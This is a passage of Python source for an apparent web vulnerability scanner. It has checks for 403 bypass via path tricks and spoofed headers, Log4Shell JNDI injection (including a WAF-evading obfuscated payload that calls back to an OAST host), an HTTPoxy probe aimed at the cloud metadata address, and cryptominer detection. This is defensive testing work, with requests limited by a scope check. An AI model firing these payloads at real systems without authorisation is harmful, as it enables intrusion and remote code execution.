    # ── 3. 403 / 401 Bypass ───────────────────────────────────────────────────
    # Source: 403Bypasser (sting8k/BurpSuite_403Bypasser)
    _BYPASS_HEADERS: list[dict] = [
        {"X-Forwarded-For":             "127.0.0.1"},
        {"X-Original-URL":              "/"},  # path filled in at call time
        {"X-Rewrite-URL":               "/"},
        {"X-Custom-IP-Authorization":   "127.0.0.1"},
        {"X-Real-IP":                   "127.0.0.1"},
        {"Client-IP":                   "127.0.0.1"},
        {"True-Client-IP":              "127.0.0.1"},
        {"X-Forwarded-Host":            "localhost"},
    ]

    def _check_403_bypass(self, sitemap) -> list[ScanFinding]:
        """Active: attempt path/header techniques to bypass 403/401 restrictions."""
        findings = []

        # Collect 403/401 endpoints from sitemap
        restricted: list[str] = [
            u for u, p in sitemap.pages.items()
            if p.get("status_code") in (403, 401) or p.get("status") in (403, 401)
        ]

        # Also probe well-known admin paths for hidden 403s
        parsed_tgt = urlparse(self.target)
        base_origin = f"{parsed_tgt.scheme}://{parsed_tgt.netloc}"
        for candidate in ["/admin", "/dashboard", "/config", "/manager", "/api/admin",
                          "/console", "/actuator", "/wp-admin", "/phpmyadmin"]:
            try:
                time.sleep(self.rate_limit)
                r = self._req("GET", base_origin + candidate)
                if r and r.status_code in (403, 401):
                    restricted.append(base_origin + candidate)
            except Exception:
                pass

        seen_urls: set[str] = set()
        for url in restricted[:10]:
            if self.stop_event.is_set():
                break
            if url in seen_urls:
                continue
            seen_urls.add(url)

            parsed_url = urlparse(url)
            path = parsed_url.path or "/"
            scheme_host = f"{parsed_url.scheme}://{parsed_url.netloc}"

            # Path manipulation variants
            path_variants = [
                f"{path}//",
                f"{path}./",
                f"{path}%2f",
                f"{path.rstrip('/')}%20",
                f"/{path.lstrip('/').lower()}",
                f"{path}..;/",
                f";/{path.lstrip('/')}",
                f"{path}#",
                f"{path}.json",
            ]
            for variant in path_variants:
                if self.stop_event.is_set():
                    break
                bypass_url = scheme_host + variant
                try:
                    time.sleep(self.rate_limit)
                    resp = self._req("GET", bypass_url)
                    if resp and resp.status_code == 200 and len(resp.text) > 80:
                        findings.append(self._make_finding(
                            url=url, method="GET", param="path",
                            param_type="path", vuln_type="access_403_bypass",
                            finding=(f"403 bypass via path variant '{variant}' "
                                     f"returned {resp.status_code} [{url}]"),
                            severity="high",
                            proof=(f"Original: 403 | Bypass: {bypass_url} | "
                                   f"Status: {resp.status_code} | Body: {resp.text[:200]}"),
                            payload=variant,
                            status_code=resp.status_code,
                        ))
                        break  # one bypass per URL is enough
                except Exception:
                    continue

            # Header-based bypass variants
            for hdr_template in self._BYPASS_HEADERS:
                if self.stop_event.is_set():
                    break
                hdr = dict(hdr_template)
                # Fill in path for URL-based overrides
                for k in ("X-Original-URL", "X-Rewrite-URL"):
                    if k in hdr:
                        hdr[k] = path
                try:
                    time.sleep(self.rate_limit)
                    resp = self._req("GET", url, headers=hdr)
                    if resp and resp.status_code == 200 and len(resp.text) > 80:
                        hdr_name = list(hdr.keys())[0]
                        findings.append(self._make_finding(
                            url=url, method="GET", param=hdr_name,
                            param_type="header", vuln_type="access_403_bypass",
                            finding=(f"403 bypass via header {hdr_name} "
                                     f"returned {resp.status_code} [{url}]"),
                            severity="high",
                            proof=(f"Original: 403 | Header: {hdr} | "
                                   f"Status: {resp.status_code} | Body: {resp.text[:200]}"),
                            payload=str(hdr),
                            status_code=resp.status_code,
                        ))
                        break
                except Exception:
                    continue

        return findings

    # ── 4. Log4Shell CVE-2021-44228 ───────────────────────────────────────────
    # Source: Log4j2Scan (whwlsfb), Log4J-Scanner (0xDexter0us), burp-log4shell (silentsignal)
    _LOG4SHELL_ERR_RE = re.compile(
        r"(?i)(com\.sun\.jndi|javax\.naming\.directory|"
        r"Error.*JNDI|JNDI.*error|LdapCtx|"
        r"Name.*not.*found.*ldap|ldap.*Name.*not.*found)",
    )

    def _check_log4shell(self, sitemap) -> list[ScanFinding]:
        """Active: probe for Log4j2 JNDI injection (CVE-2021-44228)."""
        findings: list[ScanFinding] = []

        oast_host = (f"log4shell.{self.oast.domain}"
                     if self.oast and hasattr(self.oast, "domain") else
                     "log4shell-probe.dast.invalid")

        payloads = [
            f"${{jndi:ldap://{oast_host}/a}}",
            # Obfuscated variant to bypass naive WAF rules
            (f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}"
             f":${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{oast_host}/b}}"),
            f"${{jndi:dns://{oast_host}/c}}",
        ]
        inject_hdrs = [
            "User-Agent", "X-Forwarded-For", "Referer",
            "X-Api-Version", "Accept-Language", "X-Forwarded-Host",
        ]

        for url in islice(sitemap.pages.keys(), 8):
            if self.stop_event.is_set():
                break
            for payload in payloads[:2]:
                if self.stop_event.is_set():
                    break
                for hdr in inject_hdrs:
                    if self.stop_event.is_set():
                        break
                    try:
                        time.sleep(self.rate_limit)
                        t0 = time.time()
                        resp = self._req("GET", url, headers={hdr: payload})
                        elapsed = time.time() - t0
                        if not resp:
                            continue
                        body = resp.text[:5000]

                        # Direct evidence: JNDI class names in error response
                        if self._LOG4SHELL_ERR_RE.search(body):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=hdr,
                                param_type="header", vuln_type="log4shell",
                                finding=(f"Log4Shell (CVE-2021-44228) — JNDI error leaked "
                                         f"in response via {hdr} [{url}]"),
                                severity="critical",
                                proof=(f"Header: {hdr}: {payload[:80]} | "
                                       f"Response contains JNDI indicator | Excerpt: {body[:300]}"),
                                payload=payload,
                                status_code=resp.status_code,
                                resp_time_ms=elapsed * 1000,
                            ))
                            return findings  # one confirmed finding is sufficient

                        # OAST-based: check for callback
                        if (self.oast and hasattr(self.oast, "poll")
                                and self.oast.poll(oast_host)):
                            findings.append(self._make_finding(
                                url=url, method="GET", param=hdr,
                                param_type="header", vuln_type="log4shell",
                                finding=(f"Log4Shell (CVE-2021-44228) — OAST interaction "
                                         f"received via {hdr} [{url}]"),
                                severity="critical",
                                proof=(f"Header: {hdr}: {payload[:80]} | "
                                       f"OAST DNS/HTTP callback from {oast_host}"),
                                payload=payload,
                                status_code=resp.status_code,
                                resp_time_ms=elapsed * 1000,
                            ))
                            return findings
                    except Exception:
                        continue
        return findings

    # ── 5. HTTPoxy CVE-2016-5385 ─────────────────────────────────────────────
    # Source: HTTPoxy Scanner (PortSwigger BApp Store)
    def _check_httpoxy(self, sitemap) -> list[ScanFinding]:
        """Test for HTTPoxy (CVE-2016-5385) — Proxy header SSRF in CGI/FastCGI apps."""
        findings: list[ScanFinding] = []
        cgi_signals = [".cgi", ".pl", ".php", "/cgi-bin/", "/cgi/", "/fcgi/"]
        cgi_urls = [u for u in sitemap.pages.keys()
                    if any(s in u.lower() for s in cgi_signals)]
        test_urls = list({self.target} | set(cgi_urls))[:8]

        proxy_targets = [
            "http://169.254.169.254/",  # cloud metadata (IMDSv1)
            "http://127.0.0.1:80/httpoxy-probe",
        ]

        for url in test_urls:
            if self.stop_event.is_set():
                break
            try:
                time.sleep(self.rate_limit)
                t0 = time.time()
                base_resp = self._req("GET", url)
                baseline_ms = (time.time() - t0) * 1000
                if not base_resp:
                    continue
            except Exception:
                continue

            for proxy_target in proxy_targets:
                if self.stop_event.is_set():
                    break
                try:
                    time.sleep(self.rate_limit)
                    t0 = time.time()
                    resp = self._req("GET", url, headers={"Proxy": proxy_target})
                    elapsed_ms = (time.time() - t0) * 1000
                    if not resp:
                        continue

                    # Timing signal: significant slowdown indicates attempted proxy connection
                    if elapsed_ms > baseline_ms + 3000:
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Proxy",
                            param_type="header", vuln_type="httpoxy",
                            finding=(f"HTTPoxy (CVE-2016-5385) — delayed response "
                                     f"({elapsed_ms:.0f}ms) when Proxy header set [{url}]"),
                            severity="high",
                            proof=(f"Baseline: {baseline_ms:.0f}ms | "
                                   f"With Proxy: {elapsed_ms:.0f}ms | Target: {proxy_target}"),
                            payload=f"Proxy: {proxy_target}",
                            status_code=resp.status_code,
                            resp_time_ms=elapsed_ms,
                        ))
                        break

                    # Status change signal: server error when attempting to use proxy
                    elif (resp.status_code != base_resp.status_code
                          and resp.status_code >= 500):
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Proxy",
                            param_type="header", vuln_type="httpoxy",
                            finding=(f"HTTPoxy (CVE-2016-5385) — status changed "
                                     f"({base_resp.status_code}→{resp.status_code}) "
                                     f"when Proxy header set [{url}]"),
                            severity="high",
                            proof=(f"Baseline: {base_resp.status_code} | "
                                   f"With Proxy header: {resp.status_code} | "
                                   f"Target: {proxy_target}"),
                            payload=f"Proxy: {proxy_target}",
                            status_code=resp.status_code,
                            resp_time_ms=elapsed_ms,
                        ))
                        break
                except Exception:
                    continue
        return findings

    # ── 6. Cryptomining Script Detection ─────────────────────────────────────
    # Source: Minesweeper (codingo/Minesweeper)
    _MINING_RE = re.compile(
        r"(?i)(?:"
        r"coinhive(?:\.min)?\.js|coinhive\.com|coin-hive\.com|"
        r"cryptoloot\.pro|jsecoin\.com|minero\.cc|webmr\.eu|"
        r"crypto-loot\.com|authedmine\.com|hashrate\.com|"
        r"coinhive\.anonymous|coin\.hive\.com|coin-miner\.net|"
        r"pirate-board\.net/miner|startminer\.com|feathercoin\.network/miner|"
        r"monero.*browser.*min|CryptoNoter|wasm.*cryptonight|"
        r"load\.jsecoin\.com|statically\.io.{0,50}miner"
        r")",
    )

    def _check_cryptomining(self, sitemap) -> list[ScanFinding]:
        """Passive: detect cryptomining scripts injected into pages (Minesweeper)."""
        findings: list[ScanFinding] = []
        seen: set[str] = set()
        checked = 0
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set() or checked >= 25:
                break
            checked += 1
            body = page.get("body", "")
            if not body:
                try:
                    resp = self._req("GET", url)
                    if resp:
                        body = resp.text
                except Exception:
                    continue
            if not body:
                continue
            m = self._MINING_RE.search(body)
            if m and url not in seen:
                seen.add(url)
                ctx_start = max(0, m.start() - 60)
                ctx_end   = min(len(body), m.end() + 60)
                findings.append(self._make_finding(
                    url=url, method="GET", param="body",
                    param_type="body", vuln_type="cryptomining_script",
                    finding=(f"Cryptomining script detected: "
                             f"{m.group(0)[:60]!r} found in page [{url}]"),
                    severity="high",
                    proof=(f"Pattern: {m.group(0)!r} | "
                           f"Context: {body[ctx_start:ctx_end]!r}"),
                    payload="",
                ))
        return findings

    # ─────────────────────────────────────────────────────────────────────────

    def _req(
        self,
        method: str,
        url: str,
        headers: dict | None = None,
        data: dict | None = None,
        json_body: str | None = None,
    ) -> requests.Response | None:
        if not self.scope.in_scope(url):
            return None
        try:
            h = {"User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/2.0)"}
            if headers:
                h.update(headers)
            kwargs: dict = {"timeout": self.timeout, "verify": False, "allow_redirects": False}
            if json_body:
                kwargs["data"] = json_body.encode() if isinstance(json_body, str) else json_body
            elif data:
                kwargs["data"] = data
            return self.session.request(method, url, headers=h, **kwargs)
        except Exception:
            return None

    def _make_finding(
        self,
        url: str,
        method: str,
        param: str,
        param_type: str,
        vuln_type: str,
        finding: str,
        severity: str,
        proof: str,
        payload: str,
        evidence_id: str | None = None,
        resp_time_ms: float = 0.0,
        baseline_time_ms: float = 0.0,
        time_delta_ms: float = 0.0,
        status_code: int = 0,
        confidence_level: AuditIssueConfidence | None = None,
    ) -> ScanFinding:
        sf = ScanFinding(
            id               = f"sf_{uuid.uuid4().hex[:10]}",
            url              = url,
            method           = method,
            param            = param,
            param_type       = param_type,
            vuln_type        = vuln_type,
            owasp_category   = _OWASP.get(vuln_type, "A05:2025 Security Misconfiguration"),
            cwe              = _CWE.get(vuln_type, "CWE-0"),
            finding          = finding,
            severity         = severity,
            proof            = proof,
            payload          = payload,
            evidence_id      = evidence_id,
            remediation      = _REMEDIATION.get(vuln_type, "Review and harden this endpoint."),
            resp_time_ms     = resp_time_ms,
            baseline_time_ms = baseline_time_ms,
            time_delta_ms    = time_delta_ms,
            status_code      = status_code,
            confidence_level = confidence_level or infer_confidence(vuln_type, finding, proof),
        )
        with self._lock:
            self._results.append(sf)
        return sf

    def _emit(self, sf: ScanFinding):
        if self.on_finding:
            try:
                self.on_finding(sf)
            except Exception:
                pass
